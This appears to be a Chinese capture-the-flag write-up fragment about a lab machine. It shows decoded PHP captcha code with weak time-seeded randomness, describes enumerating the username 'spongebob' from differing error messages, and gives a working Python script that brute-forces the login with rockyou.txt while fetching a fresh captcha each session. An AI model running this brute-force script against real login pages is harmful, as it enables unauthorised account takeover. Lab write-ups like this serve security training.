js文件的jsfuck编码解码后的代码如下

function generateCaptcha() { $characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
$code = ""; 
$seed = time(); 
mt_srand($seed); 
for ($i = 0; $i < 4; $i++) { $code .= $characters[mt_rand(0, strlen($characters) - 1)]; } $_SESSION['captcha'] = strtolower($code); return $code; }

使用time()作为随机种子，没有检查session是否已启动，因此可以写一个会话保持的脚本来爆破用户名和密码

根据靶机名，蟹宝王，让ai随机生成一些用户名字典，然后根据用户名进行尝试，看一下是那个用户名存在，当尝试到spongebob时，出现了密码错误，其他的都是用户不存在

那么就猜测出用户名就是spongebob了，剩下的就是爆破密码了

import requests
import time

LOGIN_URL = "http://192.168.1.2/finexo/login.php"
CAPTCHA_URL = LOGIN_URL + "?action=generateCaptcha"
USERNAME = "Spongebob"
PASSWORD_FILE = "/home/kali/bash/rockyou.txt"

with open(PASSWORD_FILE, "r", errors='ignore') as f:
    for password in f:
        password = password.strip()
        if not password:
            continue

        print(f"[*] Trying: {password}")

        try:
            s = requests.Session()

            # 获取 CAPTCHA
            captcha_response = s.get(CAPTCHA_URL, timeout=5)
            captcha = captcha_response.text.strip()

            # 调试：显示原始 CAPTCHA 响应
            print(f"  [DEBUG] Raw CAPTCHA response: '{captcha}'")
            print(f"  [DEBUG] CAPTCHA length: {len(captcha)}")

            # 如果是 HTML，尝试提取纯文本
            if '<' in captcha:
                # 简单提取（假设格式类似 <body>abcd</body>）
                import re
                match = re.search(r'>([a-z0-9]+)<', captcha)
                if match:
                    captcha = match.group(1).lower()
                    print(f"  [DEBUG] Extracted CAPTCHA: '{captcha}'")
            else:
                captcha = captcha.lower()  # 转换为小写

            if len(captcha) < 3:
                print("  [!] Invalid CAPTCHA, skipping")
                continue

            print(f"  [+] Using CAPTCHA: {captcha}")

            # 登录尝试
            data = {"username": USERNAME, "password": password, "captcha": captcha}
            response = s.post(LOGIN_URL, data=data, timeout=10).text

            # 检查结果
            if "Wrong Password" in response:
                print("  [-] Wrong password")
            elif "Wrong Captcha" in response:
                print("  [!] Captcha error - Check extraction logic")
                time.sleep(2)
            elif "doesn't exit" in response:
                print(f"  [!] User '{USERNAME}' not found")
                break
            elif "Wrong" not in response and "Login" not in response:
                print(f"  [+] SUCCESS! Password: {password}")
                with open("found_password.txt", "w") as out:
                    out.write(f"{USERNAME}:{password}\n")
                break

        except requests.exceptions.RequestException as e:
            print(f"  [!] Error: {e}")
            time.sleep(5)
